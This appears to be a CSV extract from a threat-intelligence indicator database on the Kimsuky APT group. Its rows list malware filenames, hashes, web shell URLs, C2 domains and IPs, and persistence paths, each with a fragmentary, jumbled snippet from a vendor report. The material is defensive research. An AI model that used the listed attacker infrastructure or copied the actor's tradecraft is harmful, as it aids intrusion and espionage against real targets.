Asia 2021. https://i.blackhat.com/asia-21/Friday-Handouts/as-21-Kuo-We-Are-About-To-Land-How-CloudDragon- Turns-A-Nightmare-Into-Reality.pdf. [8] Tencent. The Kimsuky APT organization uses a new AppleSeed Android component disguised as security software to attack specific ",
1.0.0,actor--kimsuky,artifact--sha256:867872792f68b380f40a0b50ffeff0feaebccd8f66b733d0137d7e8ceef6a156,observation--sha256:ab5fcb8d222e980043090fb40e70249f978e188a35f1bd0ab94418ab92e68dbe,file-name,2003.exe,2003.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c42c72677707a648c8cc7471b0aeba37d81b96058418137fc7b6f83e6aff2307,observation--sha256:f8b9071a7561fbdb388a548d7799e8ca093382bddded2339c1b937c4d7a0d41e,file-name,20230717_030190045911.pdf,20230717_030190045911.pdf,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e4196455a84c316f29a552972ae3d32c286a3f485da533f1f3c7d0423bbe59e8,observation--sha256:eb3492134ed1f960307afa219b7871430d56ba8ca63ee63779af83fdc92aed85,file-name,20230717_030190045911.pdf{blank}.exe,20230717_030190045911.pdf{blank}.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 83}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report The malware shown in light yellow in the above (Table 47) is malware signed with a valid certificate (Subject Name: EGIS Co., Ltd.) from 6 years ago. The Kimsuky organization hacked domestic companies and signed malicious code with stolen certificates. A total of 59 malicious codes were signed with the same certificate around the same time, all of which were from the Kimsuky organization. This means that the stolen certificate was only used by the Kimsuky organiza",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:63c459bc240a3a79951ce1455cd7758b5ad87f176d55034d01a4381bccbe5593,observation--sha256:82fe26bbfc3f6c6a1c7e0899b58a12aa7d6d776a1d2179a6e3b206180df3fa34,file-name,20231101_Kimsuky_OP.-Covert-Stalker.pdf,20231101_Kimsuky_OP.-Covert-Stalker.pdf,candidate,2023-10-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 924}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,[#1] https://image.ahnlab.com/atip/content/atcp/2023/10/20231101_Kimsuky_OP.-Covert-Stalker.pdf,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:82a2f74514b4f1aa990b7e5e03076f75a29d8f7d49441fd3a930bb5462d32f5c,observation--sha256:822b097f3b362fab782d0ac442b224fdd5dc5d02b2a2150ae11af230c42aed3a,file-name,2023_06.pdf,2023_06.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:95052f304629b48d817ce64588788de5c756e6b9324782f39cf1f6c3428e9040,observation--sha256:d9670dd07ba53ff0b7a031a8e986c3bdf74e8b941a59930732480883133658e7,file-name,203.234.192.200_client.zip,203.234.192.200_client.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 620}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,Drop Location: mnt/hgfs/Desktop/New folder/203.234.192.200_client.zip,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:69e3d87d40747999d872658e41102f12015c4c709115a62dbd8644beaff99bd9,observation--sha256:623a49440dd590bb4199417b3d7532324b02ec05c56bbdfafacd7729b9cd78a2,file-name,4.zip,4.zip,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6b90a3306588fce1661166533782d628bd7cdc299c12d3310706175d519e1c71,observation--sha256:cceb1eb82abcc7e57a1ace1ea8480d2eff1026956be0f6df3007737f59b91fd2,file-name,5911.pdf,5911.pdf,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0fb2959842be95445ba029f1a33873f2b296e2e5e308b4147e88ac81166c53d8,observation--sha256:a576137360768b1c16a52f67474d25dfc7efac640482da9e7469916b7d976793,file-name,5911.pdf.exe,5911.pdf.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:79f4f931966bce17855815ada4119f0ff7bb27892060e495491dc6bbedf76951,observation--sha256:de924af99e661d4b3add5d437ea94e0e2283cc61555d82d4297991cb7dc35477,file-name,68Gu8x7s78gsx6.php,68Gu8x7s78gsx6.php,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2b1174f246a5ca8a0e6123bcdf0c231e8b91d18fe285d691ae60d66ed80e8a5f,observation--sha256:92ce7e8439c1b214f87b1987b64af3c4258980b578fe5a6df84d074d1019d0bc,file-name,6_x64.rar,6_x64.rar,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:70409ffd87079fc1b98e76f3cf3af971ec08a6c281d7aa7aec0dfe9df030cab2,observation--sha256:d0620b5eb109254f6495458aceea7493a098952856cf9fbe482f8577e6e17e51,file-name,8Gu8x7s78gsvseidj6.php,8Gu8x7s78gsvseidj6.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:023254a76b926daa2ec08cdbcbb52a79890632387dcaee567ab23429f7eedf56,observation--sha256:7003edfa9f03a1f7b225a59621a6217f863ea8fec380a8baa5bd5ee6048f28ab,file-name,8Gu8x7s78gsx6519.php,8Gu8x7s78gsx6519.php,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d63e8f74724bacc5658fe030431de0e45ecd7d86edb956d6f333f98a18802b6b,observation--sha256:4dfa65ea5799470f5776dd1ae0918ee4e774cd63516abdb74eb241667c29a9b4,file-name,8Gu8x7s78gsxueidj6.php,8Gu8x7s78gsxueidj6.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e54bfe21d2a6a4ba5c436c2c317c25704d19f01352aaf3bac6d127f9b9e78ed4,observation--sha256:babca27ea4f249ca07492e6cafed5b6227f94e0a9b0aff356d7ea92a6c19589c,file-name,8x7s78gsx6.php,8x7s78gsx6.php,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2725c5208e0c225d3f87eba77425d6156fd0670ded6880c4af7ab4d17f90dfe3,observation--sha256:c7e283f544eeb9f5c1f7cab78c5462656e307a08d73135f5e7052bf884b44791,file-name,98u98h.php,98u98h.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 78}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The Kimsuky organization connects to 17*.11*.22*.18*(US) via RDP from a domestic transit point (KR) and installs an anti-virus program to block malicious code. 20230509174538 goodsjobs.eu/ LOG_ID_WEB_MAL_BLOCK This is the Green Dinosaur webshell URL for C2 management and operation purposes. The purpose of the phishing URL was explained in ""ÿ March 2023, domestic transit point (KR)."" Finally, marked in pale yellow wetaxces.online LOG_ID_WEB_MAL_BLOCK LOG_ID_WEB_MAL_BLOCK 20230509174651 healope.in",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e68237a8cbf3a26f3058972b9f96853539db9608d80954498b961cbf1137e76,observation--sha256:bd238caa0919e43c147cee3f28cae6bd7d566e15008ece2bb06c67a3b2f07088,file-name,AJAX.php,AJAX.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ navernail.eu/ewf43fewfwf4tfw4/wf7weyr892hfwogewgsfg3.php 27.255.80.170(KR) 27.102.114.89(KR) 216.189.149.71(US) ÿ www.ssktool.co.kr/ssktool/20090401skin/chinese/quick/L_quick.php 59.7.91.171(KR) ÿ www.namastte.kr/sources/Util/AJAX.php 211.53.197.220(KR) 27.255.75.137(KR) We contacted the site administrator by email to analyze the cause of the upload, but we did not receive any feedback. Operation Covert Stalker Report 1.243.200.130(KR) 185.176.43.106(BG) 27.102.107.63(KR) 27.255.81.80(KR) 162.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e68237a8cbf3a26f3058972b9f96853539db9608d80954498b961cbf1137e76,observation--sha256:6105826edcee1fbe3f94e65f3fd5fb0acff19c2400d87d84ace91b8bb9fc00eb,file-name,AJAX.php,AJAX.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e68237a8cbf3a26f3058972b9f96853539db9608d80954498b961cbf1137e76,observation--sha256:0725c2233941a1cfded5984253c1d62d57b645d27df316bd9e56eae7c1a81341,file-name,AJAX.php,AJAX.php,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e68237a8cbf3a26f3058972b9f96853539db9608d80954498b961cbf1137e76,observation--sha256:3f84ef266b15bdb1a5b48557efa837b0c11aec26a1493370d7fcbee240a62c19,file-name,AJAX.php,AJAX.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d9b594255815e37774a5f13ff33cb36c0301fdaf3c0caebf2b48b1bcdc8c3dba,observation--sha256:4e6b8efee2bf2945391f563ca6343701e90a212187c6f2186d01dec103269663,file-name,Advanced_Port_Scanner_2.5.3869.exe,Advanced_Port_Scanner_2.5.3869.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:26d0d42972ef95ca47e17622dd59cbca124a0759a195e4f31a11803fda106a0e,observation--sha256:4920f5fd0611203d8a7f757a299e5ef3a0418c1dd2ca0efabf68dc4fed4b4a69,file-name,AltcoinMiningBot.exe,AltcoinMiningBot.exe,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 15}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 8] Malicious document file in Korean language Settings ■ Comparison of Similar Threat Cases and Indicators of Compromise A number of threat cases exploiting hta files have been identified recently, especially a large proportion of the use of C2 server '(seoulhobi[.]biz / 192.186.142[.]74)’. The malware 'AltcoinMiningBot.exe' (MD5: cf264f9bca2f2fbcc2c1e7a4a491afec) disguised as Altcoin mining bot program has been distributed and communicates with the host '192.186.142[.]74'.",
1.0.0,actor--kimsuky,artifact--sha256:5eff92de1c2556a4bb4422ed62a030e9f3c73b7b0be9e3dfa8aa944237db5ab6,observation--sha256:8bb8f8ab08053b94e8df2170a75da0b0d7558981868fbdf8fdea8dc900a10512,file-name,AppleSeed.pdb,AppleSeed.pdb,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 3}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 3VIRUS BULLETIN CONFERENCE OCTOBER 2021  Distribution URL: nexfqlymnurqydrttq.esy[.]es/utopia/downloads/seed, 185.224.138.13 - PDB path of decoded binary (seed): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed.pdb - Another binary (seed64): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed64.pdb Double XOR decoding routine One of the significant features of AppleSeed is that various strings necessary for the execution of malicious codes",
1.0.0,actor--kimsuky,artifact--sha256:98ee4d1ac94781751f23827ecd792fe0625a42a0db02010f56ccea31a43dded3,observation--sha256:027aab06614cf69c1289bda57cb23c8cc3f719a4263f5b549460578ceee92ecf,file-name,AppleSeed64.pdb,AppleSeed64.pdb,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 3}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 3VIRUS BULLETIN CONFERENCE OCTOBER 2021  Distribution URL: nexfqlymnurqydrttq.esy[.]es/utopia/downloads/seed, 185.224.138.13 - PDB path of decoded binary (seed): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed.pdb - Another binary (seed64): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed64.pdb Double XOR decoding routine One of the significant features of AppleSeed is that various strings necessary for the execution of malicious codes",
1.0.0,actor--kimsuky,artifact--sha256:bcd11d555b346fee5b334e2f969219240cf04d85fb4e4b924cad53e2dc2ac169,observation--sha256:e40a23f284561b48d414fc7cb82ac9d231bf9935759a50d099fe3ea4f0302e37,file-name,Arteriosclerosis.chminherit.chmlost.chmsalary.chm,Arteriosclerosis.chminherit.chmlost.chmsalary.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:e7784a8be73492fd57d4505cc6f6b2a6bab92026701190b9e7a28560920c45e0,observation--sha256:fba107c8da2214a9aa971eb3669f063e8714b4a8c40a80c1622b7f6f80e9b470,file-name,(AutoUpdate.dll,AutoUpdate.dll,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 18}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 18 VIRUS BULLETIN CONFERENCE OCTOBER 2021 In the case of sending and receiving mail internally, due to the fact that the internal mail didn’t go through a separate security solution, executable malware could be distributed. V3 Update_3.5.1.exe (Dropper): 686e3874b772c806e0809fcb933b50ff C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll (AppleSeed):46c4c19a61e034e7b35e70c459f5692f dropper-regsvr32(x86).dll(",
1.0.0,actor--kimsuky,artifact--sha256:905594f4513bb5525df0b1d430d391262ebfa1a0e7e4e09e6e93f4b2ac3b35ff,observation--sha256:9d425afb3d5141374b20fd4cdcda90024dd869434e3beb4ac05617d3dc60d7b7,file-name,CMD.exe,CMD.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:61fa34f377227a871724865bf843b43cef5142ab1e4f20df65c0b244e6bd5720,observation--sha256:6f5a12934ed9091012b3a7e75ee59441351ba63c2cdef757f57885ddc34fdd48,file-name,Chairman.exe,Chairman.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) 